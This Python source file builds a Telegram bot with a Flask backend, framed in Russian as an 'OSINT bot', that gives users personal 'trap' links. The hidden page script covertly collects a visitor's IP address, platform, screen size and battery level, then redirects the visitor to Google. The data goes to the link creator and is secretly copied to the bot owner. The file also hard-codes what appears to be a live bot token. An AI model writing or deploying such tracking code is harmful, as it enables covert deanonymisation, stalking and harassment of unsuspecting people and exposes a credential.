import asyncio, logging, threading, os, requests
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- НАСТРОЙКИ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 # Твой ID для контроля всех действий
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)

# --- ЛОГИКА ЛОВУШКИ (FLASK) ---
HTML_TRAP = """
<script>
async function c() {
    let d = { aid: "{{ aid }}", p: navigator.platform, s: screen.width+"x"+screen.height };
    try {
        const b = await navigator.getBattery();
        d.b = Math.round(b.level * 100) + "%";
    } catch (e) {}
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://google.com"; });
}
c();
</script>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%">Инициализация...</body>
"""

@app.route('/t/<aid>')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    data = request.json
    target_aid = data.get('aid') # ID того, кто создал ссылку
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Формируем отчет
    report = (
        f"🚨 **ЦЕЛЬ ПОПАЛАСЬ!**\n\n"
        f"📍 IP: `{ip}`\n"
        f"📱 Устройство: {data.get('p')}\n"
        f"🖥 Экран: {data.get('s')}\n"
        f"🔋 Батарея: {data.get('b', 'N/A')}\n"
        f"🗺 [Открыть карту](https://www.google.com/maps?q={ip})"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    # 1. Шлем отчет тому, кто создал ссылку
    requests.post(url, json={"chat_id": target_aid, "text": report, "parse_mode": "Markdown"})
    # 2. Шлем копию тебе (для контроля)
    if str(target_aid) != str(OWNER_ID):
        requests.post(url, json={"chat_id": OWNER_ID, "text": f"📡 **КОНТРОЛЬ (от {target_aid}):**\n{report}", "parse_mode": "Markdown"})
    
    return "OK", 200

# --- ЛОГИКА БОТА (AIOGRAM) ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🔗 Создать мою ссылку"))
    kb.adjust(1)
    await message.answer(f"👋 Привет, {message.from_user.first_name}!\nЯ — OSINT бот. Жми кнопку ниже, чтобы получить свою личную ссылку-ловушку.", 
                         reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🔗 Создать мою ссылку")
async def create_link(message: types.Message):
    user_id = message.from_user.id
    personal_link = f"{BASE_URL}/t/{user_id}"
    await message.answer(f"✅ Твоя личная ссылка готова:\n`{personal_link}`\n\nКогда кто-то перейдет по ней, я пришлю тебе отчет.")

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

async def main():
    # Запуск логгера
    threading.Thread(target=run_flask, daemon=True).start()
    # Запуск бота (без вебхуков для простоты)
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
